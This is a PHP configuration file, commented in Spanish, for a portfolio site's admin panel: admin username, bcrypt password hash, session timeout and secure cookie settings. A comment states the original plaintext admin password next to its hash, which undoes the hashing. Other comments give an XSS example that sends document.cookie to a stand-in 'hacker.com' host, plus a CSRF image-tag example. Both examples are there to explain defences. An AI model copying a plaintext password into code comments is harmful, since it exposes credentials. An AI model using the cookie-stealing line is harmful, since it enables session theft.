<?php
// ════════════════════════════════════════════════════════════════════════════════════════════════════════════════
// ARCHIVO DE CONFIGURACIÓN DEL PANEL ADMINISTRATIVO (config.php)
// ════════════════════════════════════════════════════════════════════════════════════════════════════════════════
// Este archivo centraliza todas las configuraciones del sistema de administración:
// - Credenciales del usuario administrador
// - Configuración de sesiones
// - Parámetros de seguridad
// ════════════════════════════════════════════════════════════════════════════════════════════════════════════════

// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────
// PASO 1: CREDENCIALES DEL ADMINISTRADOR
// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────

// Usuario administrador del panel de control
// Se usa junto con ADMIN_PASS_HASH para validar login en admin_login.php
define('ADMIN_USER', 'admin');

// Contraseña del administrador almacenada como hash (NUNCA en texto plano)
// Contraseña original: a1d2m3i@n#
// 
// ¿POR QUÉ USAR HASH?
// - Si alguien accede a este archivo, NO ve la contraseña original
// - Las contraseñas hasheadas NO pueden ser reversibles (one-way encryption)
// - PASSWORD_DEFAULT usa bcrypt (algoritmo seguro y lento = más resistente a ataques)
//
// PARA GENERAR UN NUEVO HASH:
// 1. Abre PowerShell en XAMPP
// 2. Ejecuta: php -r "echo password_hash('TuNuevaContraseña', PASSWORD_DEFAULT);"
// 3. Copia el hash resultante y reemplázalo aquí
//

define('ADMIN_PASS_HASH', '$2y$10$2j8E/DnMLPPuRfPZq/moM.FF5uRUx/qtqPUUBUuvhOUh5fmHzZtTO');

// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────
// PASO 2: CONFIGURACIÓN DE SESIONES
// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────

// Tiempo máximo de inactividad de la sesión (en segundos)
// Si el usuario no realiza acciones en este tiempo, la sesión se cierra automáticamente
// 1800 segundos = 30 minutos
// Si quieres cambiar el tiempo:
// - 900  = 15 minutos (más seguro)
// - 1800 = 30 minutos (recomendado)
// - 3600 = 1 hora (menos seguro)
define('SESSION_LIFETIME', 1800);

// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────
// PASO 3: CONFIGURACIÓN SEGURA DE COOKIES DE SESIÓN
// ────────────────────────────────────────────────────────────────────────────────────────────────────────────────
// Estas configuraciones refuerzan la seguridad de las cookies de sesión

// httponly = 1: La cookie de sesión NO es accesible desde JavaScript
// Previene ataques XSS (Cross-Site Scripting) donde hackers roban cookies vía JS
// Ejemplo de ataque XSS sin httponly:
//   <script>fetch('http://hacker.com/robar?cookie=' + document.cookie)</script>
ini_set('session.cookie_httponly', 1);

// SameSite = Strict: La cookie se envía SOLO cuando estás en el mismo sitio
// Previene ataques CSRF (Cross-Site Request Forgery)
// Ejemplo de ataque CSRF sin SameSite:
//   Usuario logeado en tu sitio, visita un sitio malicioso que hace:
//   <img src="https://tuportafolio.com/delete_mensaje?id=1">
//   Sin SameSite, su cookie se enviaría y deletearía el mensaje
ini_set('session.cookie_samesite', 'Strict');

// use_strict_mode = 1: PHP rechaza IDs de sesión inválidos del cliente
// Previene ataques de fijación de sesión (session fixation)
// Un atacante no puede forzar a un usuario a usar una sesión específica
ini_set('session.use_strict_mode', 1);

// ════════════════════════════════════════════════════════════════════════════════════════════════════════════════
// RESUMEN DE CONFIGURACIONES DE SEGURIDAD
// ════════════════════════════════════════════════════════════════════════════════════════════════════════════════
// 1. Hash de contraseña con bcrypt: ✅ Imposible revertir
// 2. Tiempo de sesión limitado: ✅ Sesiones se cierran automáticamente
// 3. Cookie httponly: ✅ No accesible desde JavaScript
// 4. Cookie SameSite=Strict: ✅ Solo se envía en el mismo sitio
// 5. Strict mode: ✅ Rechaza IDs de sesión inválidos
// ════════════════════════════════════════════════════════════════════════════════════════════════════════════════
